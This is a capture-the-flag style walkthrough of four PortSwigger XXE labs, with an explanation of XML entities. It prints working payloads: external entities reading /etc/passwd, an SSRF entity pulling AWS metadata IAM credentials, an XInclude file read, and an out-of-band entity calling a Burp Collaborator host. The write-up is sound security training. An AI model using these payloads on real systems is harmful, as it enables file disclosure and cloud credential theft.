### XML-INJECTION (Portswigger labs)


### <u>Meaning of XML injection </u>
   XML means extensible markup language.It is a form of language designed for storing data and transporting data.It uses a tree-like structure for data storage.
It does not use predefined tags like html.Data can be given to describe the data.Xml applies important elements like xml entities,xml elements and
document type definition(DTD).The document type definition allows custom entities to declared within the declaration.There are two forms of custom entity.
- Custom Entities
- Custom External Entities
### Custom entities
For example

     <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
The value "my entity value" can be called with &myentity;
### Custom External entities
  External entities will lead us to the first portswigger challenge.This form of custom entities is declared outside the declaration.The example given below uses the keyword SYSTEM which requires a value in url format e.g file:/// url wrapper to load custom external entities.
For example

     <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>
The file url can be used to read files like /etc/passwd etc

### Challenge 1

Challenge description: Read /etc/passwd by  exploiting XXE(XML External Entity)

![2023-10-18_14-29](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/ab0f3280-ed81-4eb6-9059-916666c14bc2)

- I explored the site functionalities and I noticed that the site requests data was xml based.

  ![2023-10-18_20-56](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8a1000e6-653c-4296-b08e-7770d7d49c9d)

- I intercepted the check stock request with burpsuite and sent it to the repeater

![2023-10-18_20-59](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4d1cc80c-59a1-4b81-9f77-089634fb91fe)

- To read the file "/etc/passwd", I used this payload from hacktrickz.com

       <?xml version="1.0" encoding="UTF-8"?>
       <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
        <stockCheck><productId>
         &example;
        </productId><storeId>1</storeId></stockCheck>
    
- And I got this a response from the server showing the contents of the /etc/passwd file
  
![2023-10-18_21-14](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6252eb19-98b1-4895-8fc0-1585b75c71ea)

- I right clicked on the repeater and showed response in browser and that was how I solved the first challenge

![2023-10-18_21-18](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/e722aebe-a491-472b-8447-c14e3e14bf20)

### Challenge 2

Challenge description: Exploiting XXE to get SSRF attacks

![2023-10-18_21-25](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/d805517a-8684-402e-b21d-ee368336884e)

- From the challenge description,It was stated that the "check stock" feature parses xml input.I intercepted the the request

![2023-10-18_21-33](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/3b38d8ca-55f9-4e6c-9bb3-cbba95a42e38)

- I used this payload to get the secret token of the Amazon Ec2 metadata instance

       <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY example SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
      <stockCheck><productId>&example;</productId><storeId>1</storeId></stockCheck>

- I got this response

![2023-10-18_21-37](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6dda8f15-06c7-42f5-a078-ef7a4ce4521d)

- Challenge solved

![2023-10-18_21-50](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/208c1e52-9adc-409d-a780-9b080b868849)

### Challenge3
Challenge description: Exploit Xinclude to retrieve file /etc/passwd

![2023-10-18_22-04](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/6cdf1414-094c-48d2-a538-7626255a7b97)

- I sent the check stock feature request to the repeater,I noticed that it was not in xml format but just plain POST data

![2023-10-18_22-21](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/9c09b928-c8d3-47f6-aba5-73f661da373e)

- I pasted this payload as the value of  the productID parameter

      <foo xmlns:xi="http://www.w3.org/2001/XInclude">
      <xi:include parse="text" href="file:///etc/passwd"/></foo>
  
- And I was able to read the contents of file /etc/passwd 

![2023-10-18_22-26](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/8ca0c654-f7c7-4c90-9b23-f01e5e45dd7c)

### Challenge 4

Challenge description: Blind XXE by out-of-band interaction(Making a request to burp collaborator with XXE)

![2023-10-18_22-43](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/813ccb79-d43c-4f49-ad45-76e2d09ebb95)

- I fired up burp's collaboarator and copied the link


![2023-10-18_22-44](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/4a52c176-b314-4c5d-96a9-2e5228e1d970)

- I used this payload

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://5z5ifxf7c0kn64v7atwvdyhsbjha54tt.oastify.com"> ]>
      <stockCheck><productId>
      &xxe;</productId><storeId>1</storeId></stockCheck>
  
- Then I sent this payload to the server
    
![2023-10-18_22-52](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/c0245328-7d0f-40fe-b614-a887d7a78dfa)

- I noticed that a request has been made to burp collaborator

![2023-10-18_22-55](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/211832e4-b1e8-42f3-966a-c410ba2c0ebc)
